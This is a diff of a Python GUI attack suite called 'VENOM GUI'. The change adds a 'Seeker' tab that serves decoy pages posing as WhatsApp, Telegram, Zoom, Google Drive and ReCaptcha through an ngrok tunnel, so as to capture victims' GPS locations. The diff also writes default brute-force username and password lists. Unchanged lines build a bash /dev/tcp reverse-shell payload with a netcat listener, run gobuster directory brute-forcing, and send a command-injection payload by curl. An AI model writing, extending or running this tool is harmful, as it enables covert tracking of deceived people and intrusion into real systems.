@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
-# VENOM GUI - FIXED VERSION (NO GRID/PACK CONFLICT)
+# VENOM GUI + SEEKER - KALZ UNBREAKABLE CORE
+# FULL ATTACK SUITE + GPS LOCATION TRACKER (Seeker pre-installed)
 
 import tkinter as tk
 from tkinter import ttk, scrolledtext, messagebox, filedialog
@@ -8,17 +9,23 @@ import threading
 import os
 import sys
 import time
+import shutil
+import re
 from datetime import datetime
 
+# ========== KONFIGURASI ==========
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 RESULTS_DIR = os.path.join(BASE_DIR, "results")
 WORDLIST_DIR = os.path.join(BASE_DIR, "wordlists")
+SEEKER_DIR = os.path.join(BASE_DIR, "seeker")
+NGROK_URL_FILE = os.path.join(RESULTS_DIR, "ngrok_url.txt")
+
 os.makedirs(RESULTS_DIR, exist_ok=True)
 os.makedirs(WORDLIST_DIR, exist_ok=True)
 
-def run_command(cmd):
+def run_command(cmd, cwd=None):
     try:
-        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
+        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120, cwd=cwd)
         return r.stdout + r.stderr
     except subprocess.TimeoutExpired:
         return "[-] Timeout"
@@ -28,21 +35,33 @@ def run_command(cmd):
 class VenomGUI:
     def __init__(self, root):
         self.root = root
-        self.root.title("VENOM GUI - Kalz Unbreakable Core")
-        self.root.geometry("1200x700")
+        self.root.title("VENOM GUI - Kalz Unbreakable Core + Seeker")
+        self.root.geometry("1300x750")
         self.root.configure(bg='#1a1a1a')
         
+        # Variables
         self.target_ip = tk.StringVar()
         self.target_url = tk.StringVar()
         self.target_domain = tk.StringVar()
         self.lhost = tk.StringVar()
         self.lport = tk.StringVar()
         
+        # Seeker variables
+        self.seeker_port = tk.StringVar(value="8080")
+        self.seeker_template = tk.StringVar(value="1")
+        self.seeker_process = None
+        self.ngrok_process = None
+        
         self.setup_ui()
-
+        self.create_default_wordlists()
+        
+        # Cek apakah seeker terinstall
+        if not os.path.exists(SEEKER_DIR):
+            self.log("[!] Seeker not found. Run install.sh first.")
+        
     def setup_ui(self):
         # HEADER
-        header = tk.Label(self.root, text="[»kalz pro Active!!«]  VENOM GUI - UNBREAKABLE CORE",
+        header = tk.Label(self.root, text="[»kalz pro Active!!«]  VENOM GUI + SEEKER - UNBREAKABLE CORE",
                          fg="red", bg="black", font=('Courier', 16, 'bold'), pady=10)
         header.pack(fill=tk.X)
 
@@ -91,22 +110,150 @@ class VenomGUI:
             btn = tk.Button(left, text=text, command=cmd, bg=bg_color, fg='white', font=('Courier', 9))
             btn.pack(fill=tk.X, pady=2, padx=5)
 
-        # Clear console button
         tk.Button(left, text="CLEAR CONSOLE", command=self.clear_console, bg='#8b0000', fg='white').pack(fill=tk.X, pady=10, padx=5)
 
-        # RIGHT PANEL (output console)
-        right = tk.LabelFrame(main_frame, text="CONSOLE OUTPUT", bg='#1a1a1a', fg='#00ff00')
+        # RIGHT PANEL - Notebook (Console + Seeker)
+        right = tk.LabelFrame(main_frame, text="OUTPUT", bg='#1a1a1a', fg='#00ff00')
         right.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
 
-        self.console = scrolledtext.ScrolledText(right, wrap=tk.WORD, bg='black', fg='#00ff00', font=('Courier', 9))
-        self.console.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        self.notebook = ttk.Notebook(right)
+        self.notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+
+        # Tab 1: Console
+        console_tab = ttk.Frame(self.notebook)
+        self.notebook.add(console_tab, text="CONSOLE")
+        self.console = scrolledtext.ScrolledText(console_tab, wrap=tk.WORD, bg='black', fg='#00ff00', font=('Courier', 9))
+        self.console.pack(fill=tk.BOTH, expand=True)
+
+        # Tab 2: Seeker
+        self.create_seeker_tab()
 
         # Status bar
         self.status = tk.Label(self.root, text="Ready", bd=1, relief=tk.SUNKEN, anchor='w', bg='black', fg='red')
         self.status.pack(side=tk.BOTTOM, fill=tk.X)
 
-        self.log("[*] VENOM GUI Ready.")
+        self.log("[*] VENOM GUI + SEEKER Ready.")
 
+    def create_seeker_tab(self):
+        seeker_tab = ttk.Frame(self.notebook)
+        self.notebook.add(seeker_tab, text="SEEKER (GPS TRACKER)")
+
+        # Info
+        info = tk.Label(seeker_tab, text="Seeker - Accurate GPS Location Tracker\nHTML5 Geolocation + Ngrok tunnel\nAccuracy up to 30m (smartphone)",
+                        bg='#1a1a1a', fg='#ffff00', font=('Courier', 9))
+        info.pack(pady=5)
+
+        # Control frame
+        ctrl = tk.LabelFrame(seeker_tab, text="CONTROLS", bg='#1a1a1a', fg='#00ff00')
+        ctrl.pack(fill=tk.X, padx=10, pady=10)
+
+        # Port
+        port_frame = tk.Frame(ctrl, bg='#1a1a1a')
+        port_frame.pack(fill=tk.X, pady=5)
+        tk.Label(port_frame, text="Port:", bg='#1a1a1a', fg='#00ff00').pack(side=tk.LEFT, padx=5)
+        tk.Entry(port_frame, textvariable=self.seeker_port, width=10, bg='#2d2d2d', fg='#00ff00').pack(side=tk.LEFT, padx=5)
+
+        # Template
+        template_frame = tk.Frame(ctrl, bg='#1a1a1a')
+        template_frame.pack(fill=tk.X, pady=5)
+        tk.Label(template_frame, text="Template:", bg='#1a1a1a', fg='#00ff00').pack(side=tk.LEFT, padx=5)
+        templates = ["1 - NearYou", "2 - Google Drive", "3 - WhatsApp", "4 - WhatsApp Redirect",
+                     "5 - Telegram", "6 - Zoom", "7 - Google ReCaptcha", "8 - Custom Link Preview"]
+        combo = ttk.Combobox(template_frame, values=templates, textvariable=self.seeker_template, width=30)
+        combo.current(0)
+        combo.pack(side=tk.LEFT, padx=5)
+
+        # Buttons (tanpa install, hanya start/stop)
+        btn_frame = tk.Frame(ctrl, bg='#1a1a1a')
+        btn_frame.pack(fill=tk.X, pady=10)
+        tk.Button(btn_frame, text="START SERVER", command=self.start_seeker, bg='#006400', fg='white').pack(side=tk.LEFT, padx=5)
+        tk.Button(btn_frame, text="START NGROK", command=self.start_ngrok, bg='#8b0000', fg='white').pack(side=tk.LEFT, padx=5)
+        tk.Button(btn_frame, text="STOP ALL", command=self.stop_seeker, bg='#333333', fg='red').pack(side=tk.LEFT, padx=5)
+
+        # Ngrok URL display
+        url_frame = tk.Frame(seeker_tab, bg='#1a1a1a')
+        url_frame.pack(fill=tk.X, padx=10, pady=5)
+        tk.Label(url_frame, text="Ngrok URL:", bg='#1a1a1a', fg='#ffff00').pack(side=tk.LEFT)
+        self.ngrok_url_label = tk.Label(url_frame, text="Not started", bg='#1a1a1a', fg='red')
+        self.ngrok_url_label.pack(side=tk.LEFT, padx=5)
+
+        # Seeker console output
+        out_frame = tk.LabelFrame(seeker_tab, text="SEEKER OUTPUT", bg='#1a1a1a', fg='#00ff00')
+        out_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        self.seeker_console = scrolledtext.ScrolledText(out_frame, wrap=tk.WORD, bg='black', fg='#00ff00', font=('Courier', 9))
+        self.seeker_console.pack(fill=tk.BOTH, expand=True)
+
+    def seeker_log(self, msg):
+        self.seeker_console.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")
+        self.seeker_console.see(tk.END)
+        self.root.update()
+
+    # ========== SEEKER FUNCTIONS (no install) ==========
+    def start_seeker(self):
+        if not os.path.exists(SEEKER_DIR):
+            messagebox.showerror("Error", "Seeker not installed. Run install.sh first.")
+            return
+        port = self.seeker_port.get()
+        template_map = {
+            "1 - NearYou": "1", "2 - Google Drive": "2", "3 - WhatsApp": "3",
+            "4 - WhatsApp Redirect": "4", "5 - Telegram": "5", "6 - Zoom": "6",
+            "7 - Google ReCaptcha": "7", "8 - Custom Link Preview": "8"
+        }
+        tmpl = template_map.get(self.seeker_template.get(), "1")
+        self.seeker_log(f"[*] Starting Seeker on port {port} (template {tmpl})...")
+        def run():
+            cmd = f"cd {SEEKER_DIR} && python3 seeker.py -p {port} -t {tmpl}"
+            self.seeker_process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+            for line in iter(self.seeker_process.stdout.readline, ''):
+                self.seeker_log(line.strip())
+            self.seeker_process.wait()
+            self.seeker_log("[!] Seeker server stopped.")
+        threading.Thread(target=run, daemon=True).start()
+
+    def start_ngrok(self):
+        port = self.seeker_port.get()
+        self.seeker_log("[*] Starting Ngrok tunnel...")
+        def run():
+            self.ngrok_process = subprocess.Popen(f"ngrok http {port}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            for line in iter(self.ngrok_process.stdout.readline, ''):
+                self.seeker_log(line.strip())
+                match = re.search(r'https?://[a-zA-Z0-9.-]+\.ngrok\.(?:io|app)', line)
+                if match:
+                    url = match.group()
+                    self.ngrok_url_label.config(text=url, fg='#00ff00')
+                    self.seeker_log(f"[+] Ngrok URL: {url}")
+                    with open(NGROK_URL_FILE, "w") as f:
+                        f.write(url)
+            self.ngrok_process.wait()
+        threading.Thread(target=run, daemon=True).start()
+
+    def stop_seeker(self):
+        self.seeker_log("[*] Stopping all Seeker processes...")
+        if self.seeker_process:
+            self.seeker_process.terminate()
+            self.seeker_process = None
+        if self.ngrok_process:
+            self.ngrok_process.terminate()
+            self.ngrok_process = None
+        self.ngrok_url_label.config(text="Stopped", fg='red')
+        self.seeker_log("[+] Stopped.")
+
+    # ========== DEFAULT WORDLISTS ==========
+    def create_default_wordlists(self):
+        dirs_path = os.path.join(WORDLIST_DIR, "dirs.txt")
+        if not os.path.exists(dirs_path):
+            with open(dirs_path, 'w') as f:
+                f.write("admin\nlogin\nwp-admin\nbackup\nconfig\nuploads\nimages\napi\nv1\napp\ndev\ntest\n")
+        users_path = os.path.join(WORDLIST_DIR, "users.txt")
+        if not os.path.exists(users_path):
+            with open(users_path, 'w') as f:
+                f.write("admin\nroot\nuser\ntest\nguest\n")
+        pass_path = os.path.join(WORDLIST_DIR, "passwords.txt")
+        if not os.path.exists(pass_path):
+            with open(pass_path, 'w') as f:
+                f.write("123456\npassword\nadmin\nroot\n12345\n")
+
+    # ========== LOG & UTILS ==========
     def log(self, msg):
         self.console.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")
         self.console.see(tk.END)
@@ -123,7 +270,7 @@ class VenomGUI:
     def run_thread(self, target):
         threading.Thread(target=target, daemon=True).start()
 
-    # ========== ATTACKS ==========
+    # ========== ATTACK METHODS (sama seperti sebelumnya) ==========
     def ping_sweep(self):
         ip = self.target_ip.get().strip()
         if not ip:
@@ -154,11 +301,6 @@ class VenomGUI:
             messagebox.showerror("Error", "Target URL required")
             return
         wl = os.path.join(WORDLIST_DIR, "dirs.txt")
-        if not os.path.exists(wl):
-            self.log("[-] Wordlist not found, creating default...")
-            os.makedirs(WORDLIST_DIR, exist_ok=True)
-            with open(wl, 'w') as f:
-                f.write("admin\nlogin\nwp-admin\nbackup\nconfig\nuploads\nimages\napi\nv1\napp\ndev\ntest\n")
         self.log(f"[*] Directory brute on {url} using {wl}")
         def work():
             out = run_command(f"gobuster dir -u {url} -w {wl} -t 50")
@@ -221,8 +363,7 @@ class VenomGUI:
             messagebox.showerror("Error", "LHOST and LPORT required")
             return
         payload = f"bash -i >& /dev/tcp/{lh}/{lp} 0>&1"
-        self.log(f"[!] Reverse shell payload:")
-        self.log(payload)
+        self.log(f"[!] Reverse shell payload:\n{payload}")
         self.log(f"[*] Start listener: nc -lvnp {lp}")
         self.update_status("Ready")
 
@@ -248,7 +389,7 @@ class VenomGUI:
         url = f"http://{ip}/?cmd={encoded}"
         self.log(f"[*] Sending payload to {url}")
         def work():
-            out = run_command(f"curl -s '{url}'")
+            run_command(f"curl -s '{url}'")
             self.log("[+] Payload sent (if vulnerable, check listener)")
             self.update_status("Ready")
         self.run_thread(work)
